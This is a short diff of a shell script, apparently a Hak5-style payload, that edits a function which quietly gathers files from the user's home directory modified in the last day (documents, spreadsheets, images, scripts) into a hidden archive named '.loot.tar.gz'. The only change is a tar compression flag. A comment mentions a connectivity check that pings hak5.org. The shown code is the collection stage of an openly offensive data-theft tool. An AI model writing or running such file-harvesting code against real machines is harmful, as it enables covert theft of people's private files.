@@ -11,7 +11,7 @@ file_check() {
 
 # Creating hidden tarball function to tarball the listed documents (of the respective filetypes) that have been modified (edited) in the past 24 hours:
 tarball() {
-    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | tar -czf ~/.loot.tar.gz --null -T -
+    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | tar -caf ~/.loot.tar.gz --null -T -
 }
 
 # Creating net_check function to check for internet connectivity by send a PING to hak5.org:
